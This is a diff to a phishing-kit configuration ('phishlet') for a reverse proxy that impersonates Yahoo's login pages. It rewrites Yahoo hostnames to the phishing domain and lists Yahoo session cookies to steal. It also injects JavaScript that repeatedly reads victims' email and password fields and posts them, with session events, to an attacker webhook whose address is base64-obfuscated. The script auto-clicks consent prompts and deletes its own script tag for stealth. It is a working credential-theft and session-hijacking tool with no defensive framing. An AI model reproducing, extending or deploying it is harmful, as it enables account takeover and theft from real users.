@@ -2,12 +2,25 @@ name: 'yahoo'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'login.yahoo.com', session: true, is_landing: false}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'yahoo.com', session: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api.login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
 auth_tokens:
   - domain: '.yahoo.com'
-    keys: ['A3', 'A1', 'A1S', 'Y', 'T', 'S']
+    keys: ['B', 'F', 'G', 'A', 'Y', 'T', 'SSL', 'AO', 'CY', 'PH', 'A3', 'CRUM', 'IDS', 'GAMBIT', 'ST', 'XY', 'OS', 'HP', 'JV', 'C']
+  - domain: 'guce.yahoo.com'
+    keys: ['guce_consent_cookie', 'guce_consent_status', 'GUC']
+  - domain: '.login.yahoo.com'
+    keys: ['JSESSIONID', '__VC']
+  - domain: 'login.yahoo.com'
+    keys: ['JSESSIONID']
 credentials:
   username:
     key: 'username'
@@ -17,10 +30,6 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
-  twofa:
-    key: 'verificationCode'
-    search: '([0-9]{6})'
-    type: 'post'
 login:
   domain: 'login.yahoo.com'
   path: '/'
@@ -28,55 +37,61 @@ js_inject:
   - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){
-        const api = "https://{{.Domain}}/api/webhook";
+      (function() {
+        const api = atob('{{.DomainBase64}}') + "/api/webhook";
         const secret = "{{.WebhookSecret}}";
         const source = "yahoo";
         let capturedEmail = '';
-        
-        function sendData(type, email, password, code) {
-          const payload = { event: type, source: source, remote_addr: "{{.VpsIp}}" };
-          if (email) payload.email = email;
-          if (password) payload.password = password;
-          if (code) payload.code = code;
-          
+
+        function sendData(type, email, password) {
           fetch(api, {
             method: "POST",
             headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({ event: type, source: source, email: email, password: password, remote_addr: "{{.VpsIp}}" })
           }).catch(function(){});
         }
-        
-        function captureForm() {
+
+        function capture() {
           const emailInput = document.querySelector('input[name="username"], input[type="email"]');
           const passInput = document.querySelector('input[name="password"], input[type="password"]');
-          const codeInput = document.querySelector('input[name="verificationCode"], input[type="tel"]');
-          
+
           if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
             capturedEmail = emailInput.value;
-            sendData("email", capturedEmail, null, null);
+            sendData("email", capturedEmail, null);
           }
-          
+
           if (passInput && passInput.value) {
-            sendData("credentials", capturedEmail, passInput.value, null);
+            sendData("credentials", capturedEmail, passInput.value);
           }
-          
-          if (codeInput && codeInput.value && codeInput.value.length >= 6) {
-            sendData("2fa", capturedEmail, null, codeInput.value);
+        }
+
+        setInterval(capture, 500);
+        
+        function handleConsent() {
+          // Automatically click consent button if it appears
+          const agreeBtn = document.querySelector('button[name="agree"], button.agree, #consent-text button');
+          if (agreeBtn && !agreeBtn.hasAttribute('data-authflow-clicked')) {
+            agreeBtn.setAttribute('data-authflow-clicked', 'true');
+            agreeBtn.click();
           }
         }
         
-        // Monitor for session after login
-        setInterval(function() {
-          if (capturedEmail && document.cookie.includes('A3')) {
-            sendData("session", capturedEmail, null, null);
-          }
-        }, 3000);
+        setInterval(handleConsent, 1000);
+
+        document.addEventListener('submit', function() { setTimeout(capture, 200); });
         
-        setInterval(captureForm, 300);
-        document.querySelectorAll('form').forEach(function(f) {
-          f.addEventListener('submit', function() { setTimeout(captureForm, 500); });
-        });
+        function checkSession() {
+          if (document.cookie.includes('T=') && document.cookie.includes('Y=')) {
+             sendData("session", capturedEmail, null);
+          }
+        }
+        
+        setInterval(checkSession, 5000);
+        
+        // Scrub DOM for stealth
+        if (document.currentScript) document.currentScript.remove();
+        
+        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
       })();
 webhook:
   url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
